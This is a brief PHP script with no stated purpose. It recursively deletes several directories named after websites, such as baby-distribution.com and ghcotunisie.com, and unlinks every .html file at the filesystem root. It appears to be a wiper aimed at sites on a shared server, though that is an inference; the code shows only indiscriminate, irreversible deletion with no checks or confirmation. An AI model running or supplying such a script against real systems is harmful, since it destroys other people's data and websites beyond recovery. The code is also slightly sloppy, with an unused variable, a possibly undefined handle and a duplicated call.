<?php 
function delete_directory($dirname) {
         if (is_dir($dirname))
           $dir_handle = opendir($dirname);
     if (!$dir_handle)
          return false;
     while($file = readdir($dir_handle)) {
           if ($file != "." && $file != "..") {
                if (!is_dir($dirname."/".$file))
                     unlink($dirname."/".$file);
                else
                     delete_directory($dirname.'/'.$file);
           }
     }
     closedir($dir_handle);
     rmdir($dirname);
     return true;
}

$file_pointer = "execute.php";  
// Use unlink() function to delete a file  
$files = glob('/*.html'); //get all file names
foreach($files as $file){
    if(is_file($file))
    unlink($file); //delete file
}

    echo delete_directory('baby-distribution.com');
    echo delete_directory('demoGe');
    echo delete_directory('hpc');
    echo delete_directory('geee');
    echo delete_directory('gelighting');
    echo delete_directory('ghcotunisie.com');
    echo delete_directory('ghcotunisie.com');



 

?>